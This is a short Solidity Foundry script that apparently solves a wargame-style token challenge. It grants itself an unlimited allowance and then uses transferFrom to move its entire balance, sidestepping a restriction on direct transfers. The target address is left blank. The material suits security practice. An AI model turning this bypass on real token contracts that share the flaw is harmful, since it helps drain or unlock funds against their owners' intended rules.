//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";

contract SolvingScript is Script {
    address victim = ; /* Your instance address */

    function run() public {
        vm.startBroadcast();

        // Approving ourselves to spend all tokens
        victim.call(abi.encodeWithSignature("approve(address,uint256)", msg.sender, type(uint256).max));

        // Getting our balance
        (, bytes memory data) = victim.staticcall(abi.encodeWithSignature("balanceOf(address)", msg.sender));
        uint256 balance = abi.decode(data, (uint256));

        // Transferring all tokens to the victim contract
        victim.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, victim, balance));
        vm.stopBroadcast();
    }
}
